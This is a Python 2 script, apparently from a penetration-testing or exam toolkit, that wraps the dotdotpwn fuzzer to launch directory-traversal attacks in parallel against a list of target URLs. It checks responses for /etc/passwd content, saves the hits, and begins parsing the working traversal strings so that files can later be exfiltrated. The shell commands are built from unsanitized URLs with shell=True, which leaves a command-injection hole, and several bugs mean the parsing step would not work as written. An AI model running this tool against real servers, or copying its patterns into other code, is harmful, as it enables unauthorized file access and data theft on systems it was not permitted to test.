#!/usr/bin/python

#ONLY WEB HAS BEEN IMPLEMENTED
#TODO
#Extend web: Data extraction from files
#Extend script: Multiple protocols (FTP/TFTP)

import sys
import os
import subprocess
from subprocess import CalledProcessError
import argparse
import multiprocessing
from multiprocessing import Process, Queue
    
#This function currently runs regular and an extension web scans using ddpwn on a list of URLs
#If something is found, it will output the result to the /dirb/ directory
def dotPwn(URL):
#Usage: ./dotdotpwn.pl -m <module> -h <host> [OPTIONS]
#	Available options:
#	-m	Module [http | http-url | ftp | tftp | payload | stdout]
#	-h	Hostname
#	-O	Operating System detection for intelligent fuzzing (nmap)
#	-o	Operating System type if known ("windows", "unix" or "generic")
#	-s	Service version detection (banner grabber)
#	-d	Depth of traversals (e.g. deepness 3 equals to ../../../; default: 6)
#	-f	Specific filename (e.g. /etc/motd; default: according to OS detected, defaults in TraversalEngine.pm)
#	-E	Add @Extra_files in TraversalEngine.pm (e.g. web.config, httpd.conf, etc.)
#	-S	Use SSL for HTTP and Payload module (not needed for http-url, use a https:// url instead)
#	-u	URL with the part to be fuzzed marked as TRAVERSAL (e.g. http://foo:8080/id.php?x=TRAVERSAL&y=31337)
#	-k	Text pattern to match in the response (http-url & payload modules - e.g. "root:" if trying /etc/passwd)
#	-p	Filename with the payload to be sent and the part to be fuzzed marked with the TRAVERSAL keyword
#	-x	Port to connect (default: HTTP=80; FTP=21; TFTP=69)
#	-t	Time in milliseconds between each test (default: 300 (.3 second))
#	-X	Use the Bisection Algorithm to detect the exact deepness once a vulnerability has been found
#	-e	File extension appended at the end of each fuzz string (e.g. ".php", ".jpg", ".inc")
#	-U	Username (default: 'anonymous')
#	-P	Password (default: 'dot@dot.pwn')
#	-M	HTTP Method to use when using the 'http' module [GET | POST | HEAD | COPY | MOVE] (default: GET)
#	-r	Report filename (default: 'HOST_MM-DD-YYYY_HOUR-MIN.txt')
#	-b	Break after the first vulnerability is found
#	-q	Quiet mode (doesn't print each attempt)
#	-C	Continue if no data was received from host
    port, resultsOut, baseURL, URL = parseURL(URL)
    konfirmString = setDotPwnOptions()
    if ("TRAVERSAL" in URL):
        DOTPWN = 'dotdotpwn.pl -m http-url -u %s -k %s -d %s -o %s -x %s -t 1 -q -C' % (URL, konfirmString, args.depth, args.os, port)
        DOTPWNE = 'dotdotpwn.pl -m http-url -u %s -k %s -d %s -o %s -x %s -t 1 -e %s -q -C' % (URL, konfirmString, args.depth, args.os, port, args.extensions)
    else:
        DOTPWN = 'dotdotpwn.pl -m http -h %s -k %s -d %s -o %s -x %s -t 1 -q -C' % (baseURL, konfirmString, args.depth, args.os, port)
        DOTPWNE = 'dotdotpwn.pl -m http -h %s -k %s -d %s -o %s -x %s -t 1 -e %s -q -C' % (baseURL, konfirmString, args.depth, args.os, port, args.extensions)
    try:
        DOTPWNRESULTS = subprocess.check_output(DOTPWN, shell=True)      
    except CalledProcessError as ex:
        writeOutputFile = True
        text = ex.output.split("\n")
        for line in text:
            if ("[+] Total Traversals found: 0" == line):
                print "INFO: No traversals found for %s" % URL
                writeOutputFile = False     
            if ("<- VULNERABLE" in line):
                vuln.append(line)  
        if (writeOutputFile):    
            try:
                outfile = "/root/scripts/recon_enum/results/exam/dirb/%s" % resultsOut
                print "INFO: Traversals found! See %s" % outfile
                outFileWriter = open(outfile, "w")
                outFileWriter.write(ex.output)
                outFileWriter.close()
            except:
                raise
    try:
        DOTPWNERESULTS = subprocess.check_output(DOTPWNE, shell=True)       
    except CalledProcessError as fx: 
        writeOutputFile = True 
        textE = fx.output.split("\n")
        for line in textE:
            if ("[+] Total Traversals found: 0" == line):
                print "INFO: No traversals found for %s" % URL
                writeOutputFile = False
            if ("<- VULNERABLE" in line):
                vuln.append(line)        
        if (writeOutputFile):    
            try:
                outfile = "/root/scripts/recon_enum/results/exam/dirb/E%s" % resultsOut
                print "INFO: Traversals found! See %s" % outfile
                outFileWriter = open(outfile, "w")
                outFileWriter.write(fx.output)
                outFileWriter.close()
            except:
                raise

##1, grab port
##2, output file cannot have "/" in filename
##3, grab base url, http module doesn't like http:// 
##4, file has \n causing errors in query, strip those
def parseURL(url):
    tmp = url.split(":")
    if (len(tmp) == 3):
        tmp2 = tmp[2]
        port = tmp2.split("/")[0]
    if (len(tmp) <= 2):
        if ("https" == tmp[0]):
            port = "443"
        elif ("http" == tmp[0]):
            port = "80"
    if (len(tmp) > 3): #this should never happen
        port = "80" 
    try:
        resultsOut = url.split("/")[2] + url.split("/")[3]
    except:
        raise
    tmp4 = url.split(":")[1]
    baseURL = tmp4[2:]
    if ("\n" in url):
        URL = url[:-1]
    else:
        URL = url
    return port, resultsOut, baseURL, URL

def setDotPwnOptions():
    if (args.os == "unix"):
        konfirmString = '"root:"'
    if (args.os == "windows"):
        konfirmString = '"[fonts]"'
    return konfirmString
    
def analyzeVuln(vulnar):
#will return values to build a string like base+page+pre+path+encodedsplit+userrequestfile+suffix
#let base = IP:Port/
#let vulnPage = page.ext[/|=]
    vulnURL = []
    vulnBase = ""
    vulnPage = ""
    vulnStringPrefix = ""
    vulnStringSuffix = ""
    encodedSplit = ""
    for vuln in vulnar:
        tmp = vuln[17:len(vuln)-14]
        vulnURL.append(tmp)
        if ("http://" in tmp):       
            vulnBase = tmp.split("http://")[1]
        if ("https://" in tmp):
            vulnBase = tmp.split("https://")[1]
        vulnPagetmp = vulnBase.split("/",1)[1]
        vulnBase = vulnBase.split("/",1)[0]       
        vulnBase = vulnBase + "/"
        if ("=" in vulnPagetmp): #vulnPage with param, ie 'index.php?arg='
            vulnPage = vulnPagetmp.split("=",1)[0]
            vulnPage = vulnPage + "="
            vulnStringPrefixtmp = vulnPagetmp.split("=",1)[1]
        else:                 #vulnPage with no param, ie /index.php/
            vulnPage = vulnPagetmp.split("/",2)[1]
            vulnPage = vulnPage + "/"
            vulnStringPrefixtmp = vulnPagetmp.split("/",2)[2]
        if (args.os == 'unix'): #looking for passwd and issue, user specified file not available yet
            vulnStringPrefix = vulnStringPrefixtmp.split("etc")[0]  
            encodedSplittmp = vulnStringPrefixtmp.split("etc")[1]
            if ("passwd" in vulnStringPrefixtmp):
                vulnStringSuffix = vulnStringPrefixtmp.split("passwd")[1]
                for c in encodedSplittmp:
                    if (c == "p"):
                        break
                    else:
                        encodedSplit = encodedSplit + c
            if ("issue" in vulnStringPrefixtmp):
                vulnStringSuffix = vulnStringPrefixtmp.split("issue")[1]
                for c in encodedSplittmp:
                    if (c == "p"):
                        break
                    else:
                        encodedSplit = encodedSplit + c
        if (args.os == 'windows'):
            print "Error: Windows not supported for file exfil yet"
            raise
    return vulnBase, vulnPage, vulnStringPrefix, vulnStringSuffix, encodedSplit
    
if __name__=='__main__':

    parser = argparse.ArgumentParser(description='Rough script to handle discovery of and exfiltration of data through directory traversal')
    parser.add_argument('-d', '--scan-depth', type=int, action="store", dest="depth", default=10, help="depth of ../../../ to extend to, default of 10")
    parser.add_argument('-e', '--extensions', type=str, action="store", dest="extensions", default='".html"', help='extensions appended at the end of each fuzz string (e.g. \'".php", ".jpg", ".inc"\'  Entire list needs to be encased in single quotes. Each extension needs to be in double quotes. There needs to be a comma and a space between each extension)')
    parser.add_argument('file', type=str, help="file with URLs to iterate through")
    parser.add_argument('os', action="store", help="OS greatly helps reduce false positives and reduces scan time. 'windows' or 'unix'")
    parser.add_argument('-s', '--scan-only', action="store_true", dest="scan_only", default="true", help="only scan the target for directory traversal")
    
    args = parser.parse_args()
    print args
    vuln = []
    inputFileName = "%s" % args.file
    if (args.scan_only):
        try:
            inputFile = open(inputFileName)
            jobs = []
            for URL in inputFile:
                if (URL[0] != "#"):
                    print "Processing %s" % URL
                    p = multiprocessing.Process(target=dotPwn, args=(URL,))
                    jobs.append(p)
                    p.start()
            inputFile.close()
        except:
            raise
    print vuln
    analyzeVuln(vuln)
